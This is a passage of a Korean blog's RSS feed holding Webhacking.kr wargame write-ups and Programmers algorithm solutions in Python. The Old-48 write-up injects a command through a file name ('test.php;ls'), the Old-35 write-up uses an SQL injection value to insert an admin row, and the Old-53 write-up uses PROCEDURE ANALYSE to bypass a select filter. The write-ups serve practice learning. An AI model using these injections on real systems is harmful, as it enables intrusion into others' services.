      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-34"><a href="#Old-34" class="headerlink" title="Old - 34"></a>Old - 34</h2><p><img src="/images/pasted-530.png"><br>들어가자마자 debug me라고 alert 창이 띄어졌다.</p><p>개발자 도구를 이용하여, JS를 확인해봤다.<br><br>너무나 많은 코드가 있었고, 난독화까지 되어 있어서 분석은 힘들 것이라 생각하였다.</p><p><img src="/images/pasted-531.png"><br>그래서 맨 처음 alert창이 띄어졌는 것을 생각하여, 검색 기능으로 alert를 검색하였다.<br><br>해당 조건이 만족되지 않아서 else문으로 빠져서 alert창이 띄어졌으니, if문의 코드를 콘솔에 실행시켰다.</p><p><img src="/images/pasted-532.png"><br>자동으로 서버에 <code>?Passw0RRdd=1</code>를 보내고, Flag를 획득하였다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/30/Webhacking-kr-Old-34Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 53 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/30/Webhacking-kr-Old-53-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/30/Webhacking-kr-Old-53-Write-Up/</guid>
      <pubDate>Sun, 30 May 2021 01:26:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-53"><a href="#Old-53" class="headerlink" title="Old - 53"></a>Old - 53</h2><p><img src="/images/pasted-516.png"><br>아무 반응이 없어서 코드를 확인하였다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$db = dbconnect();</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./tablename.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;answer&#x27;</span>] == $hidden_table) solve(<span class="number">53</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/select|by/i&quot;</span>,$_GET[<span class="string">&#x27;val&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">$result = mysqli_fetch_array(mysqli_query($db,<span class="string">&quot;select a from <span class="subst">$hidden_table</span> where a=<span class="subst">&#123;$_GET[&#x27;val&#x27;]&#125;</span>&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span>($result[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>이번 문제는 테이블명을 answer에 넣어서 서버로 보내면, flag를 획득할 수 있는 문제이다.<br><br>테이블명을 얻기 위해서는 <code>select a from $hidden_table where a=&#123;$_GET[&#39;val&#39;]&#125;</code>에 SQLI를 통하여 테이블명을 얻어야 한다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/select|by/i&quot;</span>,$_GET[<span class="string">&#x27;val&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;no hack&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>select, by</code>를 검증하고 있는데, 문제는 <code>select</code>를 사용할 수 없어서 Union을 이용하여 SQLI를 진행할 수 가 없다.</p><blockquote><p><a href="https://bebhionn.tistory.com/39">6.SQL Injection&gt;테이블 명, 컬럼 명 알아내기</a><br>Union을 이용한 테이블 명을 알아내는 방법</p></blockquote><blockquote><p><a href="https://ar9ang3.tistory.com/7">웹해킹 SQLI 우회기법 정리 - Webhacking SQL Injection Bypass Honey Tips :: Is Secure?</a></p></blockquote><p>인터넷에 검색을 해봤지만, 도통 union을 사용한 방법 밖에 없어서 다른 사람의 문제풀이를 참고하였다.<br><br>나는 위 블로그에서 procedure analyse 함수를 이용한 SQLi를 배울 수 있었다.</p><p>도커에 있는 Mysql에 시도를 하니, 작동이 되지 않았다. 인터넷에 procedure analyse를 검색하니, 사용할 수 있는 버전의 제한이 있었다.</p><blockquote><p><a href="https://dev.mysql.com/doc/refman/5.7/en/procedure-analyse.html">MySQL :: MySQL 5.7 Reference Manual :: 8.4.2.4 Using PROCEDURE ANALYSE</a><br>PROCEDURE ANALYSE ()는 MySQL 5.7.18에서 더 이상 사용되지 않으며 MySQL 8.0에서 제거되었습니다.</p></blockquote><p>내가 사용하고 있는 Mysql의 버전은 8.0.23이라서 에러가 발생한 것이였다.<br></p><blockquote><p><a href="http://www.igloosec.co.kr/BLOG_MySQL%20DoS%20%EC%B7%A8%EC%95%BD%EC%A0%90(CVE-2015-4870)%EB%B6%84%EC%84%9D?searchItem=&searchWord=&bbsCateId=1&gotoPage=1">igloosec 보안이슈 :: MySQL DoS 취약점(CVE-2015-4870)분석</a></p></blockquote><p>나는 여기서 사용 가능한 버전의 범위가 궁금하여 검색을 해보니, 이글루 시큐리티에서 조사한 내용 중 MySQL 3.23.X 이상 버전에서 사용 가능한 기능이라고 명시되어있어서 3.23.X ~ 5.7.18까지의 버전에서 사용 가능하다는 것을 알 수 있었다.</p><p><img src="/images/pasted-517.png"><br>위와 같이 val 파라미터에 procedure analyse 함수를 삽입하여 보내니, 테이블 명이 출력되었다.</p><p><img src="/images/pasted-518.png"><br>해당 테이블 명을 answer 파라미터에 담아서 보내니, Flag를 획득할 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/30/Webhacking-kr-Old-53-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 모의고사</title>
      <link>https://lrtk-coder.github.io/2021/05/29/Programmers-Level-1-%EB%AA%A8%EC%9D%98%EA%B3%A0%EC%82%AC/</link>
      <guid>https://lrtk-coder.github.io/2021/05/29/Programmers-Level-1-%EB%AA%A8%EC%9D%98%EA%B3%A0%EC%82%AC/</guid>
      <pubDate>Sat, 29 May 2021 14:47:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;모의고사&quot;&gt;&lt;a href=&quot;#모의고사&quot; class=&quot;headerlink&quot; title=&quot;모의고사&quot;&gt;&lt;/a&gt;&lt;a href=&quot;&quot;&gt;모의고사&lt;/a&gt;&lt;/h1&gt;&lt;h2 id=&quot;문제-설명&quot;&gt;&lt;a href=&quot;#문제-설명&quot; class=&quot;headerlink&quot;</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="모의고사"><a href="#모의고사" class="headerlink" title="모의고사"></a><a href="">모의고사</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>수포자는 수학을 포기한 사람의 준말입니다. 수포자 삼인방은 모의고사에 수학 문제를 전부 찍으려 합니다. 수포자는 1번 문제부터 마지막 문제까지 다음과 같이 찍습니다.</p><p>1번 수포자가 찍는 방식: 1, 2, 3, 4, 5, 1, 2, 3, 4, 5, …<br><br>2번 수포자가 찍는 방식: 2, 1, 2, 3, 2, 4, 2, 5, 2, 1, 2, 3, 2, 4, 2, 5, …<br><br>3번 수포자가 찍는 방식: 3, 3, 1, 1, 2, 2, 4, 4, 5, 5, 3, 3, 1, 1, 2, 2, 4, 4, 5, 5, …<br></p><p>1번 문제부터 마지막 문제까지의 정답이 순서대로 들은 배열 answers가 주어졌을 때, 가장 많은 문제를 맞힌 사람이 누구인지 배열에 담아 return 하도록 solution 함수를 작성해주세요.</p><h2 id="제한-조건"><a href="#제한-조건" class="headerlink" title="제한 조건"></a>제한 조건</h2><ul><li>시험은 최대 10,000 문제로 구성되어있습니다.</li><li>문제의 정답은 1, 2, 3, 4, 5중 하나입니다.</li><li>가장 높은 점수를 받은 사람이 여럿일 경우, return하는 값을 오름차순 정렬해주세요.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">grading</span>(<span class="params">player:<span class="built_in">list</span>, answers:<span class="built_in">list</span></span>):</span></span><br><span class="line">    size = <span class="built_in">len</span>(player)</span><br><span class="line">    count = <span class="built_in">len</span>(answers)</span><br><span class="line">    </span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        <span class="keyword">if</span> answers[i] == player[i%size]:</span><br><span class="line">              result += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">answers:<span class="built_in">list</span></span>):</span></span><br><span class="line">    p1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    p2 = [<span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>]</span><br><span class="line">    p3 = [<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">5</span>]</span><br><span class="line">    </span><br><span class="line">    result = [(<span class="number">1</span>, grading(p1, answers)), (<span class="number">2</span>, grading(p2, answers)), (<span class="number">3</span>, grading(p3, answers))]</span><br><span class="line">    max_result = <span class="built_in">max</span>(result, key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> [i[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> result <span class="keyword">if</span> max_result[<span class="number">1</span>] == i[<span class="number">1</span>]]</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EC%99%84%EC%A0%84%ED%83%90%EC%83%89/">완전탐색</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/29/Programmers-Level-1-%EB%AA%A8%EC%9D%98%EA%B3%A0%EC%82%AC/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 48 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/29/Webhacking-kr-Old-48-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/29/Webhacking-kr-Old-48-Write-Up/</guid>
      <pubDate>Sat, 29 May 2021 05:46:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-48"><a href="#Old-48" class="headerlink" title="Old - 48"></a>Old - 48</h2><p><img src="/images/pasted-508.png"><br>입력한 Text와 파일을 업로드할 수 있는 페이지가 나왔다.</p><p><img src="/images/pasted-509.png"><br>나는 뭔가 있을 까봐 입력하여, 코드를 살펴보니 아무 것도 없었다.</p><p><img src="/images/pasted-511.png"><br>파일와 text를 입력하여 코드를 살펴보니, 역시 아무것도 없었다.<br><br>하지만 내가 업로드한 PHP은 운영체제에 명령을 전달하는 코드였고, 나는 내가 업로드한 <code>/upload/test.php</code>에 명령어를 전달하였다.</p><p><img src="/images/pasted-512.png"><br>그러나, 해당 코드는 실행이 안되고 읽기만 되는 것으로 다른 방법으로 접근을 해야한다.</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?mode=del&amp;time=1622299124</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: webhacking.kr:10006</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://webhacking.kr:10006/</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=31qq1t47nvtsrqr4bjchovl30v</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><p>그래서 마지막 기능인 delete 기능을 살펴보니, <code>/?mode=del&amp;time=1622299124</code>이 서버에 전달 되는 것을 볼 수 있었다.</p><p>여기서 나는 한가지 가정을 세울 수 있었다.<br><br>내가 만약 코드를 구현하였으면, <code>mode=del</code>를 넣겨줬으면 <code>rm</code>명령어를 통해 삭제를 진행했을 것이다.<br><br>그럼 내가 업로드한 파일의 이름을 쓸 수 밖에 없을 텐데, 만약 파일의 이름이 <code>파일명;ls</code>이면 파일을 삭제 후 ls이 실행 될 것이다.</p><p><img src="/images/pasted-513.png"><br>Filename 부분을 수정하여 <code>test.php</code>인 것을 <code>test.php;ls</code>으로 수정하고, 해당 부분을 삭제하였다.</p><p><img src="/images/pasted-514.png"><br><img src="/images/pasted-515.png"><br>그랬더니, ls이 실행이 되었고 flag를 획득할 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/29/Webhacking-kr-Old-48-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 35 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/29/Webhacking-kr-Old-35-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/29/Webhacking-kr-Old-35-Write-Up/</guid>
      <pubDate>Sat, 29 May 2021 05:26:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-35"><a href="#Old-35" class="headerlink" title="Old - 35"></a>Old - 35</h2><p><img src="/images/pasted-497.png"><br>전화번호를 입력하는 페이지가 나왔다.</p><p><img src="/images/pasted-498.png"><br><code>?phone=010-9333-0222&amp;id=guest</code><br>카페에서 여자가 내 번호를 물어봤을 때, 내가 여자의 폰에 전화번호를 입력하는 설레는 마음으로 입력하여, 서버로 보내니 no hack이 출력되었다.<br><br>왜 까였는지 확인하기 위해, 코드를 분석하였다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$db = dbconnect();</span><br><span class="line"><span class="keyword">if</span>($_GET[‘phone’] &amp;&amp; $_GET[‘id’])&#123;</span><br><span class="line">  <span class="keyword">if</span>(preg_match(“/\*|\/|=|select|-|<span class="comment">#|;/i”,$_GET[‘phone’])) exit(“no hack”);</span></span><br><span class="line">  <span class="keyword">if</span>(strlen($_GET[‘id’]) &gt; <span class="number">5</span>) <span class="keyword">exit</span>(“no hack”);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(“/admin/i”,$_GET[‘id’])) <span class="keyword">exit</span>(“you are not admin”);</span><br><span class="line">  mysqli_query($db,”insert into chall35(id,ip,phone) values(‘&#123;$_GET[‘id’]&#125;’,’&#123;$_SERVER[‘REMOTE_ADDR’]&#125;’,&#123;$_GET[‘phone’]&#125;)”) <span class="keyword">or</span> <span class="keyword">die</span>(“query <span class="built_in">error</span>”);</span><br><span class="line">  <span class="keyword">echo</span> “Done&lt;br&gt;”;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>phone과 id가 파라미터로 받는다.<br><br>phone에 <code>*, /, =, selcet, -, #, ;</code> 문자가 포함되어 있으면, “no hack”이 출력된다.<br><br>id의 길이가 5 초과이면, “no hack”이 출력된다. 또한 id이 <code>admin</code>의 문자가 포함되어 있으면 “you are not admin”이 출력된다.</p><p>위 조건을 모두 통과를 하면, <code>insert into chall35(id,ip,phone) values(‘&#123;$_GET[‘id’]&#125;’,’&#123;$_SERVER[‘REMOTE_ADDR’]&#125;’,&#123;$_GET[‘phone’]&#125;)</code>의 쿼리를 통해 값이 저장이 된다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$isAdmin = mysqli_fetch_array(mysqli_query($db,”select ip <span class="keyword">from</span> chall35 where id=‘admin’ <span class="keyword">and</span> ip=‘&#123;$_SERVER[‘REMOTE_ADDR’]&#125;’”));</span><br><span class="line"><span class="keyword">if</span>($isAdmin[‘ip’] == $_SERVER[‘REMOTE_ADDR’])&#123;</span><br><span class="line">  solve(<span class="number">35</span>);</span><br><span class="line">  mysqli_query($db,”delete <span class="keyword">from</span> chall35”);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>select ip from chall35 where id=‘admin’ and ip=‘&#123;$_SERVER[‘REMOTE_ADDR’]&#125;’</code>의 결과가 나의 공인 IP와 일치한다면, Flag를 출력한다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$phone_list = mysqli_query($db,”select * <span class="keyword">from</span> chall35 where ip=‘&#123;$_SERVER[‘REMOTE_ADDR’]&#125;’”);</span><br><span class="line"><span class="keyword">echo</span> “&lt;!--\n”;</span><br><span class="line"><span class="keyword">while</span>($r = mysqli_fetch_array($phone_list))&#123;</span><br><span class="line">  <span class="keyword">echo</span> htmlentities($r[‘id’]).” - “.$r[‘phone’].”\n”;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> “--&gt;\n”;</span><br></pre></td></tr></table></figure><p><code>select * from chall35 where ip=‘&#123;$_SERVER[‘REMOTE_ADDR’]&#125;’</code>의 결과를 HTML 주석으로 출력한다.</p><p>나는 코드를 보고 일단 chall35 테이블에 내 IP로 저장된 데이터들을 출력하였다.<br><img src="/images/pasted-499.png"><br>주석으로 데이터가 출력되었다.<br><br>나의 IP으로 저장된 admin 계정이 없고, guest 계정만 있다는 것을 알 수 있었다.</p><p>나는 <code>insert into chall35(id,ip,phone) values(‘&#123;$_GET[‘id’]&#125;’,’&#123;$_SERVER[‘REMOTE_ADDR’]&#125;’,&#123;$_GET[‘phone’]&#125;)</code>를 통해 admin을 삽입하고자 하였다.<br><img src="/images/pasted-500.png"><br>Id 파라미터에서 Hex을 검증을 안하여, hex를 이용하여 admin를 삽입하고자 하였다.</p><p><img src="/images/pasted-501.png"><br>시도를 하였지만 no hack이 출력이 되었고 그 이유를 보니, id의 길이가 5를 초과하여 no hack이 출력된 것이였다.<br></p><p>시도할 수 있는 공격백터는 id와 phone으로 진행해야하는데, id는 길이 때문에 공격에 사용할 수 없다.<br><br>phone로 공격해야한다는 것을 생각을 하였고, 혹시 내가 모르는 insert 쿼리 사용법이 있는지 알아보기로 하였다.</p><blockquote><p><a href="https://private.tistory.com/63">공부해서 남 주자</a><br>위 블로그에서 방법을 찾을 수 있었다.</p></blockquote><p><img src="/images/pasted-502.png"><br>테스트를 해보니, admin이 잘 삽입된 것을 볼 수 있다.</p><p><img src="/images/pasted-503.png"><br><code>2&#39;), (&#39;admin&#39;, &#39;223.38.91.158&#39;, &#39;3</code>으로 계속 시도하였는데 query error가 나와서 당황했는데, 문제의 코드를 자세히 보니 phone의 타입은 int형이였다.<br><br><code>2), (&#39;admin&#39;, &#39;223.38.91.158&#39;, 3</code>으로 시도하니, 정상 작동하였다.</p><p><img src="/images/pasted-504.png"><br>내가 생각한 이론이라면, Flag가 바로 출력되어야 하는데 출력이 되지 않아서 주석을 확인해보니 admin이 저장되지 않았다.</p><p><img src="/images/pasted-505.png"><br>Query문이 잘못되었다면, Error를 출력했을텐데 출력이 되지 않았으니 IP주소가 틀린 것인데 IP주소는 틀림없이 맞는 주소였다.</p><p>집에서 한번 더 시도하고, 안되면 다른 사람의 풀이를 참고해야겠다……</p><p><img src="/images/pasted-506.png"><br><img src="/images/pasted-507.png"><br>집에서 시도하였더니, flag를 획득할 수 있었다.<br><br>밖에선 아이폰의 핫스팟으로 시도하였는데, 왜 안됬는지 의문이다. 일단 문의 넣어봤다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/29/Webhacking-kr-Old-35-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 2016년</title>
      <link>https://lrtk-coder.github.io/2021/05/28/Programmers-Level-1-2016%EB%85%84/</link>
      <guid>https://lrtk-coder.github.io/2021/05/28/Programmers-Level-1-2016%EB%85%84/</guid>
      <pubDate>Fri, 28 May 2021 15:53:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;2016&quot;&gt;&lt;a href=&quot;#2016&quot; class=&quot;headerlink&quot; title=&quot;2016&quot;&gt;&lt;/a&gt;&lt;a href=&quot;&quot;&gt;2016&lt;/a&gt;&lt;/h1&gt;&lt;h2 id=&quot;문제-설명&quot;&gt;&lt;a href=&quot;#문제-설명&quot; class=&quot;headerlink&quot;</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="2016"><a href="#2016" class="headerlink" title="2016"></a><a href="">2016</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>2016년 1월 1일은 금요일입니다. 2016년 a월 b일은 무슨 요일일까요? 두 수 a ,b를 입력받아 2016년 a월 b일이 무슨 요일인지 리턴하는 함수, solution을 완성하세요. 요일의 이름은 일요일부터 토요일까지 각각 <code>SUN,MON,TUE,WED,THU,FRI,SAT</code>입니다. 예를 들어 a=5, b=24라면 5월 24일은 화요일이므로 문자열 “TUE”를 반환하세요.</p><h2 id="제한-조건"><a href="#제한-조건" class="headerlink" title="제한 조건"></a>제한 조건</h2><ul><li>2016년은 윤년입니다.</li><li>2016년 a월 b일은 실제로 있는 날입니다. (13월 26일이나 2월 45일같은 날짜는 주어지지 않습니다)</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    week = [<span class="string">&#x27;MON&#x27;</span>, <span class="string">&#x27;TUE&#x27;</span>, <span class="string">&#x27;WED&#x27;</span>, <span class="string">&#x27;THU&#x27;</span>, <span class="string">&#x27;FRI&#x27;</span>, <span class="string">&#x27;SAT&#x27;</span>, <span class="string">&#x27;SUN&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> week[datetime.date(<span class="number">2016</span>, a, b).weekday()]</span><br></pre></td></tr></table></figure><p>datetime 모듈을 이용하여 간단하게 풀이하였다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/28/Programmers-Level-1-2016%EB%85%84/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 시저 암호</title>
      <link>https://lrtk-coder.github.io/2021/05/28/Programmers-Level-1-%EC%8B%9C%EC%A0%80-%EC%95%94%ED%98%B8/</link>
      <guid>https://lrtk-coder.github.io/2021/05/28/Programmers-Level-1-%EC%8B%9C%EC%A0%80-%EC%95%94%ED%98%B8/</guid>
      <pubDate>Fri, 28 May 2021 15:10:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;시저-암호&quot;&gt;&lt;a href=&quot;#시저-암호&quot; class=&quot;headerlink&quot; title=&quot;시저 암호&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/lessons/12926&quot;&gt;시저 암</description>
        
      
      
      
